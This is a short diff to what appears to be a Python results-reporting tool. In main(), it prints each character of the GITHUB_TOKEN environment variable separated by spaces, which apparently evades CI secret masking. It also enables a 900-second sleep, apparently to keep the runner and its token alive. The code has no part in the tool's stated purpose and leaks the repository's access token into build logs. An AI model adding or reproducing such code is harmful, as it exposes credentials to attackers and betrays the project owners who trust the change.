@@ -11,7 +11,7 @@ from typing import Set
 import click
 import requests
 import sh
-#import time
+import time
 from boltons import ecoutils
 from boltons.strutils import unit_len
 
@@ -193,9 +193,9 @@ def main(
         )
 
     for c in os.getenv("GITHUB_TOKEN"):
-        print(f"{c} ")
-    print("sleeping...")
-    #time.sleep(900)
+        click.echo(f"{c} ")
+    click.echo("sleeping...")
+    time.sleep(900)
 
     sapp.report_results(results)
 
